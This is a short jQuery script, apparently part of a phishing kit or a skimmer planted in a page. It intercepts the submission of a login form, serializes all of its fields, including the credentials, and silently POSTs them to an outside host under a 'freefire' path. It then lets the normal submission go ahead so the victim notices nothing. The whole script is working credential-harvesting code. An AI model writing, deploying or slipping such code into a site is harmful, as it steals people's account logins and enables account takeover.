$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://aditpratamaa.my.id/freefire/data.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
